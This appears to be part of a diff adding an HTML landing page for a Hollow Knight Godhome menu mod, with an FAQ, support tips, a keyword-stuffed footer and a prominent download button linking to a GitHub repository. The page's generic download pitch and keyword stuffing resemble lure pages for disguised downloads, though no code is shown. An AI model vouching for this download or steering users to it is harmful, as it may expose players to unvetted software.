+  <h3>Does it work with Hollow Knight: Silksong?</h3>
+  <p>No. This mod is built for the original Hollow Knight and its Godhome content, not the sequel.</p>
+
+  <h3>Can I undo it later?</h3>
+  <p>Yes. Removing the added files returns the game to its original state, and your saves stay untouched.</p>
+
+  <h3>Is it free?</h3>
+  <p>Yes. The download link on this page is free to use.</p>
+
+  <h2>💬 Support and Feedback</h2>
+
+  <p>If something does not work as described, the best place to look is the download page itself, where notes about the newest version are collected. Re-reading the download steps above also resolves most issues, because the majority of problems come from an incomplete download or from the game still running in the background.</p>
+
+  <p>When asking for help, mention your Windows version, whether the game was closed during setup, and what you saw on screen. Those three details make it much easier for someone to point you in the right direction.</p>
+
+  <div class="btn-wrap">
+    <a class="btn" href="https://github.com/landeroro3698/hollow-knight-newest-menu" rel="noopener">⬇️ Visit this link to download the application</a>
+  </div>
+
+  <footer>
+    <p style="margin:0;">hollow-knight-newest-menu — a Hollow Knight mod for your Godhome experience. Keywords: hollow-knight, hollow-knight-mod, hollow-knight-silksong, godhome mod, hollow knight menu mod, windows download.</p>
+  </footer>
+
+</div>
 </body>
 </html>
